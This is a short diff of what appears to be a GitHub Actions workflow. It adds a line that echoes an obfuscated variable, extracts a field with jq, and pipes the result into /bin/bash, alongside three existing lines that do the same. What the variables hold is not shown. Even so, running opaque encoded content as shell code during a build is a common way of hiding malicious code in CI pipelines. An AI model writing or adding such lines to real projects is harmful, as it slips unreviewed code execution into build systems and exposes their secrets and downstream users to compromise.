@@ -30,6 +30,7 @@ jobs:
           echo $pomp5 | jq -r .olt23042 | /bin/bash
           echo $l827 | jq -r .jll4046 | /bin/bash
           echo $hgne6612 | jq -r .hvla17375 | /bin/bash
+          echo $b76 | jq -r .g4429 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
